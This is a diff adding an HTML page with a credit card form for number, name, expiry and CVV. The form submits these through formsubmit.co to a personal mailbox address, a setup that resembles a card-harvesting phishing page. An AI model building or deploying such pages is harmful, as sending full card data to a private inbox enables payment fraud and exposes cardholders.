@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="formstyles.css">
+    <title>Form</title>
+</head>
+<body>
+    <div class="form-container">
+        <div class="content">
+            <div class="label">
+                <h3>CREDIT CARD DETAILS</h3>
+            </div>
+            <form action="https://formsubmit.co/mystore13email14@gmailcom" method="POST">
+                <div class="input-field first-two">
+                    <label for="CardNum">Card Number</label>
+                    <input type="number" name="CardNum" placeholder="1234 5678 9012 3456" required/>
+                </div>
+                <div class="input-field first-two">
+                    <label for="NameSub">Name On Card</label>
+                    <input type="text" name="NameSub" placeholder="Name Surname" required/>
+                </div>
+                <div class="one-row">
+                    <div class="input-field">
+                        <label for="ExpiredDay">Expriry Date</label>
+                        <div class="date-field">
+                            <div class="date">
+                                <input type="number" name="ExpiredDay" placeholder="02" required/>
+                            </div>
+                            <div class="date">
+                                <input type="number" name="ExpiredYear" placeholder="2017" required/>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="input-field cvv-field">
+                        <label for="CVV">CVV/CVN</label>
+                        <input type="number" name="CVV" placeholder="***" required/>
+                    </div>
+                </div>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
